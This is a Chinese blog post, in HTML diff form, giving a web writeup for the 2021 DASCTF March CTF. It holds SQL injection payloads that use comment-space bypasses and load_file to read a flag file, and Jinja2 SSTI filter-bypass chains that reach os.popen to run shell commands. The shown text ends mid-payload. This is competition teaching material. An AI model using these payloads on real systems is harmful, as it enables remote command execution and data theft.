@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"npfs06.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="2021 MAR DASCTF 明御攻防赛 Web Writeup">
+<meta property="og:type" content="website">
+<meta property="og:title" content="2021 DASCTF三月赛">
+<meta property="og:url" content="https://npfs06.top/posts/2021-DASCTF%E4%B8%89%E6%9C%88%E8%B5%9B.html">
+<meta property="og:site_name" content="安小琪&#39;s blog">
+<meta property="og:description" content="2021 MAR DASCTF 明御攻防赛 Web Writeup">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img.npfs06.top/20210406142203.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210406200259.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="http://img.npfs06.top/20210406204043.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210406203323.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210406225357.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210406225302.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210407191625.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="article:published_time" content="2021-04-06T14:55:59.000Z">
+<meta property="article:modified_time" content="2021-04-06T14:55:59.000Z">
+<meta property="article:author" content="安小琪">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.npfs06.top/20210406142203.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+
+<link rel="canonical" href="https://npfs06.top/posts/2021-DASCTF%E4%B8%89%E6%9C%88%E8%B5%9B">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2021 DASCTF三月赛 | 安小琪's blog
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">安小琪's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">少年有梦，不应止于心动</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="en">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">2021 DASCTF三月赛
+</h1>
+
+<div class="post-meta">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <p>2021 MAR DASCTF 明御攻防赛 Web Writeup<a id="more"></a></p>
+<h1 id="BestDB"><a href="#BestDB" class="headerlink" title="BestDB"></a>BestDB</h1><p>查看源码发现注释</p>
+<blockquote>
+<!-- $sql = "SELECT * FROM users WHERE id = '$query' OR username = \"$query\"";-->
+</blockquote>
+<p>同时通过fuzz,发现过滤了单引号和空格</p>
+<p>注释里的sql语句id和username是用OR连接，因为双引号没有被过滤，因此我们可以利用username</p>
+<p><img src="https://img.npfs06.top/20210406142203.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>测试得出回显位为1、2</p>
+<p>查数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;union/**/select/**/1,database(),3&quot;</span><br><span class="line"></span><br><span class="line">#users</span><br></pre></td></tr></table></figure>
+<p>查表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),3&quot;</span><br><span class="line"></span><br><span class="line">#f1agdas,users</span><br></pre></td></tr></table></figure>
+<p>查列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;union/**/select/**/1,(select/**/f1agdas/**/from/**/f1agdas/**/where/**/id=1),3&quot;</span><br><span class="line">#flag.txt</span><br></pre></td></tr></table></figure>
+
+
+<p>读flag.txt</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;/**/union/**/select/**/1,(select(substr(load_file(0x2f666c61672e747874),1,100))),3&quot;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h1><p> 看源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Hi young boy!&lt;/br&gt;</span></span><br><span class="line"><span class="comment">Do you like ssti?&lt;/br&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">blacklist&lt;/br&gt;   </span></span><br><span class="line"><span class="comment">&#x27;.&#x27;,&#x27;[&#x27;,&#x27;\&#x27;&#x27;,&#x27;&quot;&#x27;,&#x27;&#x27;\\&#x27;,&#x27;+&#x27;,&#x27;:&#x27;,&#x27;_&#x27;,&lt;/br&gt;   </span></span><br><span class="line"><span class="comment">&#x27;chr&#x27;,&#x27;pop&#x27;,&#x27;class&#x27;,&#x27;base&#x27;,&#x27;mro&#x27;,&#x27;init&#x27;,&#x27;globals&#x27;,&#x27;get&#x27;,&lt;/br&gt;   </span></span><br><span class="line"><span class="comment">&#x27;eval&#x27;,&#x27;exec&#x27;,&#x27;os&#x27;,&#x27;popen&#x27;,&#x27;open&#x27;,&#x27;read&#x27;,&lt;/br&gt;   </span></span><br><span class="line"><span class="comment">&#x27;select&#x27;,&#x27;url_for&#x27;,&#x27;get_flashed_messages&#x27;,&#x27;config&#x27;,&#x27;request&#x27;,&lt;/br&gt;   </span></span><br><span class="line"><span class="comment">&#x27;count&#x27;,&#x27;length&#x27;,&#x27;０&#x27;,&#x27;１&#x27;,&#x27;２&#x27;,&#x27;３&#x27;,&#x27;４&#x27;,&#x27;５&#x27;,&#x27;６&#x27;,&#x27;７&#x27;,&#x27;８&#x27;,&#x27;９&#x27;,&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;&lt;/br&gt;    </span></span><br><span class="line"><span class="comment">&lt;/br&gt;   </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
+<p>fuzz后发现没过滤掉|attr，因此拿attr来绕即可，利用flask中的join过滤器同样可以拼接出：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set gl=dict(glo=a,bals=a)|join%&#125;</span><br></pre></td></tr></table></figure>
+<p>拿python做了个例子，原理类似</p>
+<p><img src="https://img.npfs06.top/20210406200259.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>数字被过滤了可以使用这些特殊的数字来绕过</p>
+<p><img src="http://img.npfs06.top/20210406204043.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p><img src="https://img.npfs06.top/20210406203323.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a=dict(po=aa,p=aa)|join%&#125; <span class="comment"># pop</span></span><br><span class="line">&#123;%set b=lipsum|<span class="keyword">string</span>|<span class="keyword">list</span>|attr(a)(𝟙𝟠)%&#125; <span class="comment"># _</span></span><br><span class="line">&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125; <span class="comment"># globals</span></span><br><span class="line">&#123;%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%&#125; <span class="comment"># getitem</span></span><br><span class="line">&#123;%set e=dict(o=cc,s=aa)|join%&#125; <span class="comment"># os</span></span><br><span class="line">&#123;%set f=lipsum|<span class="keyword">string</span>|<span class="keyword">list</span>|attr(a)(𝟡)%&#125; <span class="comment"># 空格</span></span><br><span class="line">&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|<span class="keyword">string</span>|<span class="keyword">list</span>)|attr(a)(-𝟠)%&#125; <span class="comment"># 斜杠</span></span><br><span class="line">&#123;%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%&#125; <span class="comment"># cat /flag</span></span><br><span class="line">&#123;%set h=(a,dict(en=aa)|join|join)|join%&#125; <span class="comment"># popen</span></span><br><span class="line">&#123;%set i=dict(re=aa,ad=aa)|join%&#125; <span class="comment"># read</span></span><br><span class="line">&#123;%set z=(((lipsum|attr(c))|attr(d)(e))|<span class="keyword">string</span>|<span class="keyword">list</span>)|attr(a)(-𝟝)%&#125; <span class="comment">#点</span></span><br><span class="line">&#123;%set j=(dict(ls=aa)|join,f,g,(dict(<span class="keyword">var</span>=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%&#125; <span class="comment">#ls /var/www/flask</span></span><br><span class="line">&#123;%<span class="keyword">print</span> (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;</span><br><span class="line"><span class="comment">#最后拼接起来</span></span><br><span class="line"><span class="comment">#&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls /var/www/flask&#x27;).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>最后的<code>payload</code>如下，成功执行<code>ls /var/www/flask</code>就可以看到<code>flag</code>了</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">name=</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> b=lipsum|string|list|attr(a)(𝟙𝟠)%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="keyword">join</span>,b,b)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> d=(b,b,dict(ge=cc,tit=dd,em=aa)|<span class="keyword">join</span>,b,b)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> f=lipsum|string|list|attr(a)(𝟡)%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> i=(dict(cat=aa)|<span class="keyword">join</span>,f,g,dict(flag=aa)|<span class="keyword">join</span>)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> h=(a,dict(en=aa)|<span class="keyword">join</span>|<span class="keyword">join</span>)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> i=dict(re=aa,ad=aa)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125;</span><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> j=(dict(ls=aa)|<span class="keyword">join</span>,f,g,(dict(var=aa)|<span class="keyword">join</span>),g,(dict(www=aa)|<span class="keyword">join</span>),g,(dict(flask=aa)|<span class="keyword">join</span>)|<span class="keyword">join</span>)|<span class="keyword">join</span>%&#125;</span><span class="template-tag">&#123;%<span class="name">print</span> (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;</span><span class="template-variable">&#123;&#123;j&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>当然上面这种做法是利用了unicode编码，如果不利于unicode编码，我们也有办法</p>
+<p>比如我们要构造下划线<code>_</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set id=dict(ind=a,ex=a)|join%&#125;</span><br><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set nn=dict(n=a)|join%&#125;</span><br><span class="line">&#123;% set tt=dict(t=a)|join%&#125;</span><br><span class="line">&#123;% set ff=dict(f=a)|join%&#125;</span><br><span class="line">&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;</span><br><span class="line">&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;</span><br><span class="line">&#123;% set shiba=five*five-three-three-one %&#125;</span><br><span class="line">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;</span><br><span class="line">&#123;&#123;xiahuaxian&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>相当于<code>(lipsum|string|list).pop(18)</code></p>
+<p>放几个其他师傅的payload:</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> id=dict(ind=a,ex=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pp=dict(po=a,p=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ls=dict(ls=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ppe=dict(po=a,pen=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> gt=dict(ge=a,t=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> cr=dict(ch=a,r=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> nn=dict(n=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> tt=dict(t=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ff=dict(f=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ooqq=dict(o=a,s=a)|<span class="keyword">join</span> %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> rd=dict(re=a,ad=a)|<span class="keyword">join</span>%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> five=(lipsum|string|list)|attr(id)(tt) %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> three=(lipsum|string|list)|attr(id)(nn) %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> one=(lipsum|string|list)|attr(id)(ff) %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> shiba=five*five-three-three-one %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|<span class="keyword">join</span>,xiahuaxian,xiahuaxian)|<span class="keyword">join</span> %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|<span class="keyword">join</span>,xiahuaxian,xiahuaxian)|<span class="keyword">join</span> %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> space=chcr(three*three*five-five-five-three) %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> shell=(ls,space,xiegang,dict(var=a)|<span class="keyword">join</span>,xiegang,dict(www=a)|<span class="keyword">join</span>,xiegang,dict(flask=a)|<span class="keyword">join</span>)|<span class="keyword">join</span> %&#125;</span></span><br><span class="line"><span class="template-variable">&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>相当于执行</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">lipsum</span><span class="selector-class">.__globals__</span><span class="selector-class">.get</span>(<span class="string">&#x27;os&#x27;</span>)<span class="selector-class">.popen</span>(<span class="string">&#x27;ls /var/www/flask&#x27;</span>)<span class="selector-class">.read</span>()</span><br></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"># 首先构造出所需的数字: </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> zero = (self|int) %&#125;</span><span class="xml">    # 0, 也可以使用lenght过滤器获取数字</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> one = (zero**zero)|int %&#125;</span><span class="xml">    # 1</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> two = (zero-one-one)|<span class="keyword">abs</span> %&#125;</span><span class="xml">    # 2</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> four = (two*two)|int %&#125;</span><span class="xml">    # 4</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> five = (two*two*two)-one-one-one %&#125;</span><span class="xml">    # 5</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> three = five-one-one %&#125;</span><span class="xml">    # 3</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> nine = (two*two*two*two-five-one-one) %&#125;</span><span class="xml">    # 9</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> seven = (zero-one-one-five)|<span class="keyword">abs</span> %&#125;</span><span class="xml">    # 7</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 构造出所需的各种字符与字符串: </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> space = self|string|min %&#125;</span><span class="xml">    # 空格</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> point = self|float|string|min %&#125;</span><span class="xml">    # .</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> c = dict(c=aa)|<span class="keyword">reverse</span>|<span class="keyword">first</span> %&#125;</span><span class="xml">    # 字符 c</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfh = self|string|urlencode|<span class="keyword">first</span> %&#125;</span><span class="xml">    # 百分号 %</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfhc = bfh~c %&#125;</span><span class="xml">    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> slas = bfhc%((four~seven)|int) %&#125;</span><span class="xml">    # 使用%c构造斜杠 /</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> yin = bfhc%((three~nine)|int) %&#125;</span><span class="xml">    # 使用%c构造引号 &#x27;</span></span><br><span class="line"><span class="template-tag">&#123;% <span 